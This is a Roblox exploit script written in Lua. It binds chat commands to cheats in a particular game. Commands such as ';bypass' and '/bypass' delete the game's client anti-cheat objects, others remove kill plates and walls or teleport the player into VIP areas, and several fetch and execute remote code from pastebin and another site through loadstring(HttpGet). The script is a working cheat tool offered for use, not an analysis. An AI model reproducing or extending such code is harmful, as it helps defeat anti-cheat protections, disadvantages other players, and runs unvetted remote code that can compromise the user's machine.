local Player = game.Players.LocalPlayer

Player.Chatted:connect(function(cht)
	if cht:match(";bypass")then
		game:GetService("Players").LocalPlayer.PlayerGui.Extra.AntiSploitClient2:Destroy()
		wait(1)
		game:GetService("Players").LocalPlayer.PlayerGui.Extra.AntiSploitClient:Destroy()
	elseif cht:match("/gui")then
		loadstring(game:HttpGet('https://pastebin.com/raw/2ScLeev0', true))()
	elseif cht:match("/skywars")then
		loadstring(game:HttpGet('https://pastebin.com/raw/20xeX1n7', true))()
	elseif cht:match("/hitbox")then
		loadstring(game:HttpGet("http://gameovers.net/Scripts/Free/HitboxExpander/main.lua", true))()
	elseif cht:match("/bypass")then
		if _G.AcBypassed == nil then
			local plr = game:GetService("Players").LocalPlayer

			if plr.PlayerGui.Extra:FindFirstChild("AntiSploitClient") and plr.PlayerGui.Extra:FindFirstChild("AntiSploitClient2") then
				plr.PlayerGui.Extra.AntiSploitClient:Destroy()
				plr.PlayerGui.Extra.AntiSploitClient2:Destroy()
			end

			plr.CharacterAdded:Connect(function()
				plr.PlayerGui:WaitForChild("Extra"):WaitForChild("AntiSploitClient"):Destroy()
				plr.PlayerGui:WaitForChild("Extra"):WaitForChild("AntiSploitClient2"):Destroy()
			end)
		end

		_G.AcBypassed = true
	elseif cht:match("/cmds")then
		loadstring(game:HttpGet('https://pastebin.com/raw/PUWPbetg', true))()
	elseif cht:match("/removekillplates")then
		game.workspace.Lobby.KillPlates:remove()
	elseif cht:match("/tpshop")then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(58.9466209, 264, -0.0603171512)
	elseif cht:match("/vip") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.00376499468, 264, -70.1360855)
	elseif cht:match("/removewalls")then
		game.workspace.Borders.InvisibleBorder:remove()
	elseif cht:match("/tpmid")then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7.82356358, 168.999878, -3.8226738)
	elseif cht:match("/megavip")then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.0143262977, 264, 69.7455139)
	elseif cht:match("/reset")then
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
	elseif cht:match("/hatgiver")then
		loadstring(game:HttpGet(('https://pastebin.com/raw/dAy5u2hX'),true))()
	elseif cht:match("/galefighter")then
		loadstring(game:HttpGet(('https://pastebin.com/raw/1E4Wkv6A'),true))()
	elseif cht:match("/helmet")then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(12.2420492, 264.999908, 78.8482742)
	elseif cht:match("/armor")then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-10.8926039, 264.999908, 61.0910683)
	elseif cht:match("/netbypass")then
		loadstring(game:HttpGet(('https://pastebin.com/raw/TveK3NLm'),true))()
	elseif cht:match("/hatfling")then
	    loadstring(game:HttpGet(('https://pastebin.com/raw/ZLsAJXD0'),true))()
	elseif cht:match("/korblox")then
        loadstring(game:HttpGet(('https://pastebin.com/raw/dsmeQBwB'),true))()
	end
end)
